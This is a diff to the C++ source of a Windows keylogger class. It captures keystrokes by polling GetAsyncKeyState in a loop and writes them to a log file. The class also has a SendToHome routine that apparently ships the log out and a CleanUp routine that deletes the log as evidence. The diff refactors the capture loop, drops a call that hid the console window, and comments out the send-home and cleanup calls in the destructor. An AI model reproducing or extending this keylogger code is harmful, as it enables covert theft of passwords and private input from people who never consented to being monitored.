@@ -1,26 +1,30 @@
-#define _WIN32_WINNT 0x0500
+#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
+
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
+#include <thread>
+#include <experimental/filesystem>
 
 #include "KeyLogger.h"
 
-std::atomic_bool cleanup = false;
+std::atomic_bool keylogger_cleanup = false;
 
-KeyLogger::KeyLogger(std::string log_file)
-{
-	this->log_file = log_file;
-	this->keylogger_thread = std::thread([this] {this->CaptureKeys(); });
-}
+KeyLogger::KeyLogger(std::string log_file) : log_file(log_file) { }
 
 void KeyLogger::Deploy()
 {
-	this->keylogger_thread.join();
+	this->CaptureKeys();
 }
 
 void KeyLogger::CaptureKeys()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	char current_key = 'x';
 
-	while (!cleanup) {
+	while (!keylogger_cleanup) {
 		for (int KEY = 8; KEY <= 190; KEY++)
 		{
 			if (GetAsyncKeyState(KEY) == -32767) {
@@ -37,14 +41,14 @@ void KeyLogger::SendToHome()
 
 void KeyLogger::CleanUp()
 {
-	cleanup = true;
-	remove(this->log_file.c_str());
+	keylogger_cleanup = true;
+	std::experimental::filesystem::remove(this->log_file.c_str());
 }
 
 KeyLogger::~KeyLogger()
 {
-	this->SendToHome();
-	this->CleanUp();
+	/*this->SendToHome();
+	this->CleanUp();*/
 }
 
 std::string KeyLogger::GetKeyString(int keycode) {
@@ -78,7 +82,7 @@ std::string KeyLogger::GetKeyString(int keycode) {
 	case VK_MENU:
 		return "#ALT#";
 	default:
-		return std::to_string((char)keycode);
+		return std::to_string(keycode);
 	}
 }
 
